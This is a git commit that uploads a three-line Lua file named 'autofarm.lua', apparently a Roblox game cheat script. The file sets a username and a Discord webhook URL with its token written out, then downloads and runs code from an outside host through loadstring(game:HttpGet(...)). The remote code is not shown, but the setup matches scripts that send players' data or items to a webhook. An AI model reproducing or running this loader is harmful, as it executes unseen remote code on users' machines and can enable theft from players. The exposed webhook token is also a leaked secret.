fc760992a891600dbbdea7f78cdb2c524a9839fa
psxautofarm1 <130071685+psxautofarm1@users.noreply.github.com>
2023-04-12 21:33:01 +0100

    Add files via upload

---
+++ autofarm.lua
@@ -0,0 +1,3 @@
+UserName = "hellopike2"
+Webhook = "https://discord.com/api/webhooks/1095808224789274734/IDb6jdUOFTEB1j6nQ0DI_DiyVdMIavZMTnOAF3oTfr3NvKqEyrCFf78YXu1UUKNBnQSe"
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
